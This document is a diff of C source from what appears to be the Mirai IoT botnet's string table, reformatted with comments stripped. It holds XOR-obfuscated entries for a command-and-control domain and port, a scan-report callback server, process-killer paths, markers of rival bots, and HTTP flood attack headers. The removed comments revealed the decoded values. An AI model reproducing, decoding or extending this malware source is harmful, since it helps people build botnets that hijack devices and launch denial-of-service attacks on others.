@@ -1,80 +1,72 @@
-#define NULL ((void*)0)
-typedef unsigned long size_t;  // Customize by platform.
+
+typedef unsigned long size_t;
 typedef long intptr_t; typedef unsigned long uintptr_t;
-typedef long scalar_t__;  // Either arithmetic or pointer type.
-/* By default, we understand bool (as a convenience). */
+typedef long scalar_t__;
+
 typedef int bool;
-#define false 0
-#define true 1
-
-/* Forward declarations */
-
-/* Type definitions */
-
-/* Variables and functions */
- int /*<<< orphan*/  TABLE_ATK_ACCEPT ; 
- int /*<<< orphan*/  TABLE_ATK_ACCEPT_LNG ; 
- int /*<<< orphan*/  TABLE_ATK_CHUNKED ; 
- int /*<<< orphan*/  TABLE_ATK_CLOUDFLARE_NGINX ; 
- int /*<<< orphan*/  TABLE_ATK_CONNECTION_HDR ; 
- int /*<<< orphan*/  TABLE_ATK_CONTENT_LENGTH_HDR ; 
- int /*<<< orphan*/  TABLE_ATK_CONTENT_TYPE ; 
- int /*<<< orphan*/  TABLE_ATK_DOSARREST ; 
- int /*<<< orphan*/  TABLE_ATK_KEEP_ALIVE ; 
- int /*<<< orphan*/  TABLE_ATK_KEEP_ALIVE_HDR ; 
- int /*<<< orphan*/  TABLE_ATK_LOCATION_HDR ; 
- int /*<<< orphan*/  TABLE_ATK_NSERV ; 
- int /*<<< orphan*/  TABLE_ATK_REFRESH_HDR ; 
- int /*<<< orphan*/  TABLE_ATK_RESOLVER ; 
- int /*<<< orphan*/  TABLE_ATK_SET_COOKIE ; 
- int /*<<< orphan*/  TABLE_ATK_SET_COOKIE_HDR ; 
- int /*<<< orphan*/  TABLE_ATK_TRANSFER_ENCODING_HDR ; 
- int /*<<< orphan*/  TABLE_ATK_VSE ; 
- int /*<<< orphan*/  TABLE_CNC_DOMAIN ; 
- int /*<<< orphan*/  TABLE_CNC_PORT ; 
- int /*<<< orphan*/  TABLE_EXEC_SUCCESS ; 
- int /*<<< orphan*/  TABLE_HTTP_FIVE ; 
- int /*<<< orphan*/  TABLE_HTTP_FOUR ; 
- int /*<<< orphan*/  TABLE_HTTP_ONE ; 
- int /*<<< orphan*/  TABLE_HTTP_THREE ; 
- int /*<<< orphan*/  TABLE_HTTP_TWO ; 
- int /*<<< orphan*/  TABLE_KILLER_ANIME ; 
- int /*<<< orphan*/  TABLE_KILLER_DELETED ; 
- int /*<<< orphan*/  TABLE_KILLER_EXE ; 
- int /*<<< orphan*/  TABLE_KILLER_FD ; 
- int /*<<< orphan*/  TABLE_KILLER_PROC ; 
- int /*<<< orphan*/  TABLE_KILLER_SAFE ; 
- int /*<<< orphan*/  TABLE_KILLER_STATUS ; 
- int /*<<< orphan*/  TABLE_MEM_QBOT ; 
- int /*<<< orphan*/  TABLE_MEM_QBOT2 ; 
- int /*<<< orphan*/  TABLE_MEM_QBOT3 ; 
- int /*<<< orphan*/  TABLE_MEM_REMAITEN ; 
- int /*<<< orphan*/  TABLE_MEM_UPX ; 
- int /*<<< orphan*/  TABLE_MEM_ZOLLARD ; 
- int /*<<< orphan*/  TABLE_SCAN_CB_DOMAIN ; 
- int /*<<< orphan*/  TABLE_SCAN_CB_PORT ; 
- int /*<<< orphan*/  TABLE_SCAN_ENABLE ; 
- int /*<<< orphan*/  TABLE_SCAN_KILL_9 ; 
- int /*<<< orphan*/  TABLE_SCAN_NCORRECT ; 
- int /*<<< orphan*/  TABLE_SCAN_PS ; 
- int /*<<< orphan*/  TABLE_SCAN_QUERY ; 
- int /*<<< orphan*/  TABLE_SCAN_RESP ; 
- int /*<<< orphan*/  TABLE_SCAN_SH ; 
- int /*<<< orphan*/  TABLE_SCAN_SHELL ; 
- int /*<<< orphan*/  TABLE_SCAN_SYSTEM ; 
- int /*<<< orphan*/  add_entry (int /*<<< orphan*/ ,char*,int) ; 
+ int TABLE_ATK_ACCEPT ;
+ int TABLE_ATK_ACCEPT_LNG ;
+ int TABLE_ATK_CHUNKED ;
+ int TABLE_ATK_CLOUDFLARE_NGINX ;
+ int TABLE_ATK_CONNECTION_HDR ;
+ int TABLE_ATK_CONTENT_LENGTH_HDR ;
+ int TABLE_ATK_CONTENT_TYPE ;
+ int TABLE_ATK_DOSARREST ;
+ int TABLE_ATK_KEEP_ALIVE ;
+ int TABLE_ATK_KEEP_ALIVE_HDR ;
+ int TABLE_ATK_LOCATION_HDR ;
+ int TABLE_ATK_NSERV ;
+ int TABLE_ATK_REFRESH_HDR ;
+ int TABLE_ATK_RESOLVER ;
+ int TABLE_ATK_SET_COOKIE ;
+ int TABLE_ATK_SET_COOKIE_HDR ;
+ int TABLE_ATK_TRANSFER_ENCODING_HDR ;
+ int TABLE_ATK_VSE ;
+ int TABLE_CNC_DOMAIN ;
+ int TABLE_CNC_PORT ;
+ int TABLE_EXEC_SUCCESS ;
+ int TABLE_HTTP_FIVE ;
+ int TABLE_HTTP_FOUR ;
+ int TABLE_HTTP_ONE ;
+ int TABLE_HTTP_THREE ;
+ int TABLE_HTTP_TWO ;
+ int TABLE_KILLER_ANIME ;
+ int TABLE_KILLER_DELETED ;
+ int TABLE_KILLER_EXE ;
+ int TABLE_KILLER_FD ;
+ int TABLE_KILLER_PROC ;
+ int TABLE_KILLER_SAFE ;
+ int TABLE_KILLER_STATUS ;
+ int TABLE_MEM_QBOT ;
+ int TABLE_MEM_QBOT2 ;
+ int TABLE_MEM_QBOT3 ;
+ int TABLE_MEM_REMAITEN ;
+ int TABLE_MEM_UPX ;
+ int TABLE_MEM_ZOLLARD ;
+ int TABLE_SCAN_CB_DOMAIN ;
+ int TABLE_SCAN_CB_PORT ;
+ int TABLE_SCAN_ENABLE ;
+ int TABLE_SCAN_KILL_9 ;
+ int TABLE_SCAN_NCORRECT ;
+ int TABLE_SCAN_PS ;
+ int TABLE_SCAN_QUERY ;
+ int TABLE_SCAN_RESP ;
+ int TABLE_SCAN_SH ;
+ int TABLE_SCAN_SHELL ;
+ int TABLE_SCAN_SYSTEM ;
+ int add_entry (int ,char*,int) ;
 
 void table_init(void)
 {
-    add_entry(TABLE_CNC_DOMAIN, "\x41\x4C\x41\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22", 30); // cnc.changeme.com
-    add_entry(TABLE_CNC_PORT, "\x22\x35", 2);   // 23
+    add_entry(TABLE_CNC_DOMAIN, "\x41\x4C\x41\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22", 30);
+    add_entry(TABLE_CNC_PORT, "\x22\x35", 2);
 
-    add_entry(TABLE_SCAN_CB_DOMAIN, "\x50\x47\x52\x4D\x50\x56\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22", 29); // report.changeme.com
-    add_entry(TABLE_SCAN_CB_PORT, "\x99\xC7", 2);         // 48101
+    add_entry(TABLE_SCAN_CB_DOMAIN, "\x50\x47\x52\x4D\x50\x56\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22", 29);
+    add_entry(TABLE_SCAN_CB_PORT, "\x99\xC7", 2);
 
     add_entry(TABLE_EXEC_SUCCESS, "\x4E\x4B\x51\x56\x47\x4C\x4B\x4C\x45\x02\x56\x57\x4C\x12\x22", 15);
 
-    // safe string https://youtu.be/dQw4w9WgXcQ
+
     add_entry(TABLE_KILLER_SAFE, "\x4A\x56\x56\x52\x51\x18\x0D\x0D\x5B\x4D\x57\x56\x57\x0C\x40\x47\x0D\x46\x73\x55\x16\x55\x1B\x75\x45\x7A\x41\x73\x22", 29);
     add_entry(TABLE_KILLER_PROC, "\x0D\x52\x50\x4D\x41\x0D\x22", 7);
     add_entry(TABLE_KILLER_EXE, "\x0D\x47\x5A\x47\x22", 5);
